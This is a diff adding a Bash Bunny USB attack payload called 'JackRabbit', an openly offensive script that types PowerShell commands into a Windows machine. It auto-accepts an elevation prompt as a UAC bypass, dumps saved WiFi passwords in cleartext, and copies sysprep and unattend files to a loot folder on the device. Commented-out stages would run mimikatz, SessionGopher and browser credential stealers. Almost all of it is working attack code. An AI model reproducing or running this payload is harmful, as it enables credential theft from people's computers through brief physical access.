@@ -1,0 +1,169 @@
+#!/bin/bash
+# Credit goes to illwill (fist and foremost) / Hak5Darren / RazerBlade /
+# This is a mix payload that will be expanded upon, so I am not removing the original Author's description; but not everything written inthe description is done by the payload. Many items will be borught in and merely commented out until they are ready for primetime.
+# Title:         JackRabbit
+# Author:        illwill
+# Version:       0.1
+#
+# Jacks the Browsers/Windows/WiFi/SSH passwords and install config files from Windows boxes by downloading a 
+# Powershell script into memory then stashes them in /root/udisk/loot/JackRabbit/%ComputerName%
+#
+# Credits to these guys for their powershell scripts:
+# https://github.com/sekirkity/BrowserGather BrowserGather.ps1
+# https://github.com/EmpireProject/Empire    Get-FoxDump.ps1
+# https://github.com/fireeye/SessionGopher   SessionGopher .ps1
+# https://github.com/gentilkiwi/mimikatz     md.ps1 from gentilkiwi/clymb3r/mattifestation obfuscated to mimidogz
+#################################################################################################################
+# Title:         USB Exfiltrator
+# Author:        Hak5Darren
+# Version:       1.1
+# Target:        Windows XP SP3+
+# Props:         Diggster, IMcPwn
+# Category:      Exfiltration
+# 
+# Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
+# which in turn executes e.cmd invisibly using i.vbs
+# which in turn executes and if stated, copies documents to the loot folder on the Bash Bunny.
+#
+
+LED ATTACK
+ATTACKMODE HID STORAGE
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''UNTITLLED''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
+Q DELAY 1500
+Q ALT F4
+LED R B 200
+LOOTDIR=/root/udisk/loot/JackRabbit
+mkdir -p $LOOTDIR
+
+# wait 6 seconds for the storage to popup
+Q DELAY 6000
+Q GUI r
+Q DELAY 1000
+Q STRING POWERSHELL
+Q ENTER
+Q DELAY 1500
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'UNTITLLED\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 1500
+
+# Make the loot folder of the computername
+Q STRING \$LOOTDIR3 \= \"\$\(\$Bunny\)\\loot\\JackRabbit\\\$\(\$env:computername\)-\$\(\$env:username\)\"
+Q ENTER
+Q DELAY 1500
+Q STRING md \$LOOTDIR3\\
+Q ENTER
+Q DELAY 1000
+
+# Jackin' Credential Vault (I.E./Edge)
+#Q STRING \$ClassHolder \= \[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType\=WindowsRuntime\]\;
+#Q STRING \$VaultObj \= new-object Windows.Security.Credentials.PasswordVault\; \$VaultObj.RetrieveAll\(\) \| 
+#Q STRING foreach \{ \$_.RetrievePassword\(\)\; \$_ \} \|
+#Q STRING select Resource, UserName, Password \| Sort-Object Resource \| ft -AutoSize \| Out-File \$LOOTDIR3\\IE-Edge.txt
+#Q ENTER
+#Q DELAY 1000
+Q STRING exit
+Q ENTER
+
+# UAC Bypass
+Q GUI r
+Q STRING powershell -c "Start-Process powershell -verb runas"
+Q ENTER
+Q DELAY 1500
+Q ALT y
+Q DELAY 3000
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'UNTITLLED\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 1000
+Q STRING \$LOOTDIR3 \= \"\$\(\$Bunny\)\\loot\\JackRabbit\\\$\(\$env:computername\)-\$\(\$env:username\)\"
+Q ENTER
+Q DELAY 1000
+
+# Jackin' Windows creds
+#RUN WIN powershell ".((gwmi win32_volume -f 'label=''UNTITLLED''').Name+'payloads\\$SWITCH_POSITION\md.ps1')"; Invoke-Mimidogz -DumpCred \| Out-File -Append \$LOOTDIR3\\MimiKatz.txt
+#Q DELAY 1000
+#Q ENTER
+
+# Get WiFi creds 
+Q STRING \(netsh wlan show profiles\) \| Select-String \"\\:\(.+\)\$\" \| \%\{\$name\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| 
+Q STRING \%\{\(netsh wlan show profile name\=\""\$name\"" key\=clear\)\}  \| Select-String \""Key Content\\W+\\:(.+)\$\"" \|
+Q STRING \%\{\$pass\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| \%\{\[PSCustomObject\]@\{ "PROFILE_NAME"\=\$name\;PASSWORD\=\$pass \}\} \| 
+Q STRING Format-Table -AutoSize \| Out-File \$LOOTDIR3\\WiFi.txt
+Q ENTER
+Q DELAY 1000
+
+# Jackin' SSH Creds
+# change to "Invoke-SessionGopher -Thorough" if you want to search for PuTTY private key (.ppk), Remote Desktop (.rdp), and RSA token (.sdtid) files, to extract private key and session information.
+#RUN WIN powershell ".((gwmi win32_volume -f 'label=''UNTITLLED''').Name+'payloads\\$SWITCH_POSITION\SessionGopher.ps1')"; Invoke-SessionGopher \| ft -AutoSize \| Out-File \$LOOTDIR3\\SSH.txt
+#Q ENTER
+#Q DELAY 1000
+
+# Jackin' dem install configs -- doesn't seem to error or get anything; may be due to my test VM
+Q STRING \$F \= @\(\)\;\$F \+\= \"C:\\sysprep.inf\"\;\$F \+\= \"C:\\sysprep\\sysprep.xml\"\;\$F \+\= \"C:\\WINDOWS\\panther\\Unattend\\Unattended.xml\"\;\$F \+\= \"C:\\WINDOWS\\panther\\Unattended.xml\"\;
+Q STRING \$i \= 0\; foreach\(\$file in \$F\) \{if \(Test-Path \$file\)\{cp \$file \$LOOTDIR3\;\$i\+\+\}\}
+Q ENTER
+Q DELAY 1000
+
+# BlackBackup Cred stealing method -- doesn't appear to run or error out
+#Q STRING powerShell -windowstyle hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''UNTITLLED''').Name+'payloads\\$SWITCH_POSITION\credentials.ps1')"
+#Q ENTER
+#Q DELAY 1000
+
+# Local Chrome Creds
+#Q STRING powerShell -windowstyle hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''UNTITLLED''').Name+'payloads\\$SWITCH_POSITION\BrowserGather.ps1\')"; Get-ChromeCreds \| ft -AutoSize \| Out-File \$LOOTDIR3\\Chrome.txt
+#Q ENTER
+#Q DELAY 1000
+
+# Open 32bit powershell and Jackin' Firefox Creds
+#Q DELAY 1000
+#Q GUI r
+#Q DELAY 1000
+#Q STRING \%SystemRoot\%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe
+#Q ENTER
+#Q DELAY 2000
+#Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'UNTITLLED\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+#Q ENTER
+#Q DELAY 1000
+#Q STRING \$LOOTDIR3 \= \"\$\(\$Bunny\)\\loot\\JackRabbit\\\$\(\$env:computername\)-\$\(\$env:username\)\"
+#Q ENTER
+#Q DELAY 1000
+#Q STRING powerShell -windowstyle hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''UNTITLLED''').Name+'payloads\\$SWITCH_POSITION\Get-FoxDump.ps1')"; Get-FoxDump \| Out-File \$LOOTDIR3\\FireFox.txt
+#Q ENTER
+#Q DELAY 1000
+#Q STRING exit
+#Q ENTER
+
+# Output DONE to root of USB file to let bashbunny we're all good in the hood
+Q DELAY 1000
+Q STRING Out-File -FilePath \$BUNNY\\loot\\DONE
+Q ENTER
+Q DELAY 1000
+
+# Eject Safely
+Q STRING \$Eject \=  New-Object -comObject Shell.Application
+Q ENTER
+Q DELAY 1000
+Q STRING \$Eject.NameSpace\(17\).ParseName\(\$Bunny\).InvokeVerb\(\"Eject\"\)
+Q ENTER
+Q DELAY 1000
+
+# GTFO
+Q STRING EXIT
+Q ENTER
+
+#Sync Drive
+sync
+LED FINISH
+
+FILE="/root/udisk/loot/DONE"
+while [ ! -e $FILE ]; do sleep 1; done;
+sleep 1;
+if [ -e $FILE ]; then rm -f $FILE; LED G 200
+else LED R; 
+  for (( ; ; ))
+  do
+    LED R; 
+    sleep 1;
+    LED B;
+    sleep 1;
+  done
+fi
